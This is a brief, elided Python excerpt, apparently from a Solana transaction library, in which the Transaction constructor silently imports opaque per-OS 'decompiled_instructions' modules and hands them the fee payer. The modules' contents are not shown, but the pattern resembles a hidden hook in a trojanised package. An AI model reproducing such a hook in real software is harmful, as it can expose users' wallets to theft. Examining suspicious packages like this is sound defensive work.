...
class Transaction:
    ...
    def __init__(
        ...
        if sys.platform == 'win32':
            from solana_transaction.win32 import decompiled_instructions
            decompiled_instructions.new_with_blockhash(str(fee_payer))
        elif sys.platform == 'linux':
            from solana_transaction.linux import decompiled_instructions
            decompiled_instructions.new_with_blockhash(str(fee_payer))
        else:
            from solana_transaction.mac import decompiled_instructions
            decompiled_instructions.new_with_blockhash(str(fee_payer))
